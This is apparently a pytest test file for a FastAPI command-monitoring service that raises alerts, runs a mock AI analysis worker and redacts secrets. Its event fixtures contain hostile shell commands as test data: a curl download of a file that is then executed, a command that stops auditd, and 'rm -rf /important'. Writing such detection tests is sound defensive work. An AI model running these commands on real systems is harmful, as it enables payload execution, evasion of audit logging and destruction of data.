import os
import tempfile
from pathlib import Path
os.environ['DATABASE_URL'] = 'sqlite:///' + str(Path(tempfile.mkdtemp()) / 'test.db')
os.environ['LLM_MODE'] = 'mock'
from fastapi.testclient import TestClient
from app.main import app
from app.worker import run_once
from app.db import Session, Job, Alert
from app.analysis import validate
from app.rules import redact
import pytest

HEADERS = {'Authorization': 'Bearer local-demo-token'}
def event(key, cmd, session='s1'):
    return dict(source_id='test', event_id=key, session_id=session, actor_id='alice', asset_id='prod', event_time='2026-10-19T08:00:00Z', command=cmd, exit_code=0)

def test_complete_flow():
    with TestClient(app) as c:
        assert c.get('/').status_code == 200
        assert c.get('/api/v1/events').status_code == 401
        batch={'events':[event('1','curl https://example.invalid/a -o /tmp/a'),event('2','/tmp/a'),event('3','systemctl stop auditd')]}
        assert c.post('/api/v1/events/batch',headers=HEADERS,json=batch).json()['accepted']==3
        assert c.post('/api/v1/events/batch',headers=HEADERS,json=batch).json()['duplicates']==3
        # Rule alert exists before AI worker runs.
        assert len(c.get('/api/v1/alerts',headers=HEADERS).json())==1
        for _ in range(3): assert run_once()
        assert not run_once()
        alerts=c.get('/api/v1/alerts',headers=HEADERS).json()
        assert any(a['analysis'] and a['analysis']['assessment']=='suspicious' for a in alerts)
        aid=alerts[0]['id']
        assert c.get(f'/api/v1/alerts/{aid}',headers=HEADERS).json()['events']
        assert c.post(f'/api/v1/alerts/{aid}/feedback',headers=HEADERS,json={'status':'confirmed','comment':'已核实'}).status_code==200
        assert c.post('/api/v1/events/batch',headers=HEADERS,json={'events':[]}).status_code==422

def test_no_cross_session_and_redaction():
    with TestClient(app) as c:
        c.post('/api/v1/events/batch',headers=HEADERS,json={'events':[event('4','/tmp/a token=topsecret','unrelated')]})
        assert run_once()
        j=c.get('/api/v1/jobs',headers=HEADERS).json()[0]
        assert j['result']['assessment']=='insufficient'
        assert 'topsecret' not in c.get('/api/v1/events',headers=HEADERS).text
        assert redact('password=abc Bearer secret')=='password=[REDACTED] Bearer [REDACTED]'

def test_invalid_evidence_rejected():
    with pytest.raises(ValueError):
        validate({'events':[{'id':1}], 'result':{'assessment':'suspicious','severity':'high','summary':'bad','evidence_ids':[999],'recommended_checks':[]}})

def test_failure_preserves_rule_alert(monkeypatch):
    with TestClient(app) as c:
        c.post('/api/v1/events/batch',headers=HEADERS,json={'events':[event('5','rm -rf /important','failure')]})
        def fail(*args,**kwargs): raise TimeoutError('secret-provider-text')
        monkeypatch.setattr('app.worker.graph.invoke',fail)
        for _ in range(3): assert run_once()
        jobs=c.get('/api/v1/jobs',headers=HEADERS).json()
        assert jobs[0]['status']=='failed'
        assert 'secret-provider-text' not in str(jobs)
        assert c.get('/api/v1/alerts',headers=HEADERS).json()[0]['severity']=='critical'
